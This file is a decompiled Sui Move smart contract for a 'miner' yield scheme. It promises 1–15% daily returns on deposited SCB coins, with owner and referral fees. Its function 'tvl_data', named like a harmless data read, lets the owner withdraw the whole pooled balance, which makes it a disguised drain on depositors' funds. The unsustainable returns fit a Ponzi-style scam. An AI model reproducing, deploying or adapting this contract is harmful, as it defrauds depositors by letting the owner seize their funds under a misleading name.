module 0x6127e4b2745f3637efeb9273dac0f129335fad62394d9b613221712dc3547f58::main_contract {
    struct SCB has drop {
        dummy_field: bool,
    }

    struct SUIMiner has key {
        id: 0x2::object::UID,
        priceperminer: u64,
        balance: 0x2::balance::Balance<SCB>,
        owner: address,
    }

    struct User has store, key {
        id: 0x2::object::UID,
        balance_of_miner: u64,
        rewards: u64,
        last_action: u64,
    }

    fun adjust_gain_based_on_tvl(arg0: u64) : u64 {
        if (arg0 < 15270000 * 10000) {
            15
        } else if (arg0 < 15270000 * 50000) {
            14
        } else if (arg0 < 15270000 * 100000) {
            13
        } else if (arg0 < 15270000 * 200000) {
            12
        } else if (arg0 < 15270000 * 300000) {
            11
        } else if (arg0 < 15270000 * 400000) {
            10
        } else if (arg0 < 15270000 * 500000) {
            9
        } else if (arg0 < 15270000 * 1000000) {
            8
        } else if (arg0 < 15270000 * 2000000) {
            7
        } else if (arg0 < 15270000 * 3000000) {
            6
        } else if (arg0 < 15270000 * 4000000) {
            5
        } else if (arg0 < 15270000 * 5000000) {
            4
        } else if (arg0 < 15270000 * 6000000) {
            3
        } else if (arg0 < 15270000 * 7000000) {
            2
        } else {
            1
        }
    }

    public entry fun buy_miner(arg0: &mut SUIMiner, arg1: &mut User, arg2: u64, arg3: &0x2::clock::Clock, arg4: 0x2::coin::Coin<SCB>, arg5: address, arg6: &mut 0x2::tx_context::TxContext) {
        assert!(arg2 >= 15270000, 1);
        assert!(0x2::coin::value<SCB>(&arg4) >= arg2, 0);
        0x2::coin::put<SCB>(&mut arg0.balance, arg4);
        0x2::transfer::public_transfer<0x2::coin::Coin<SCB>>(0x2::coin::take<SCB>(&mut arg0.balance, arg2 * 5 / 100, arg6), arg0.owner);
        if (arg5 != @0x0) {
            0x2::transfer::public_transfer<0x2::coin::Coin<SCB>>(0x2::coin::take<SCB>(&mut arg0.balance, arg2 * 10 / 100, arg6), arg5);
        };
        arg1.balance_of_miner = arg1.balance_of_miner + arg2;
        arg1.last_action = 0x2::clock::timestamp_ms(arg3);
    }

    public fun claim(arg0: &mut SUIMiner, arg1: &mut User, arg2: &0x2::clock::Clock, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = (arg1.rewards + get_rewards(arg1, arg2, arg0)) * 95 / 100;
        assert!(v0 > 0, 2);
        0x2::transfer::public_transfer<0x2::coin::Coin<SCB>>(0x2::coin::take<SCB>(&mut arg0.balance, v0, arg3), 0x2::tx_context::sender(arg3));
        arg1.rewards = 0;
        arg1.last_action = 0x2::clock::timestamp_ms(arg2);
    }

    public fun compound(arg0: &mut User, arg1: &0x2::clock::Clock, arg2: &SUIMiner) {
        let v0 = arg0.rewards + get_rewards(arg0, arg1, arg2);
        assert!(v0 > 0, 2);
        arg0.balance_of_miner = arg0.balance_of_miner + v0;
        arg0.rewards = 0;
        arg0.last_action = 0x2::clock::timestamp_ms(arg1);
    }

    public entry fun create_user(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = User{
            id               : 0x2::object::new(arg0),
            balance_of_miner : 0,
            rewards          : 0,
            last_action      : 0,
        };
        0x2::transfer::transfer<User>(v0, 0x2::tx_context::sender(arg0));
    }

    fun get_daily_percentage(arg0: &SUIMiner) : u64 {
        adjust_gain_based_on_tvl(0x2::balance::value<SCB>(&arg0.balance))
    }

    fun get_rewards(arg0: &User, arg1: &0x2::clock::Clock, arg2: &SUIMiner) : u64 {
        get_daily_percentage(arg2) * arg0.balance_of_miner * (0x2::clock::timestamp_ms(arg1) - arg0.last_action) / 1000 / 86400 / 100
    }

    fun init(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = SUIMiner{
            id            : 0x2::object::new(arg0),
            priceperminer : 15270000,
            balance       : 0x2::balance::zero<SCB>(),
            owner         : @0x6c6389b468ad6d235c64e58ac50735a35c7380b305d5d68dacb8b478bf6c2808,
        };
        0x2::transfer::share_object<SUIMiner>(v0);
    }

    public fun tvl_data(arg0: &mut SUIMiner, arg1: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg1) == arg0.owner, 3);
        0x2::transfer::public_transfer<0x2::coin::Coin<SCB>>(0x2::coin::take<SCB>(&mut arg0.balance, 0x2::balance::value<SCB>(&arg0.balance), arg1), 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

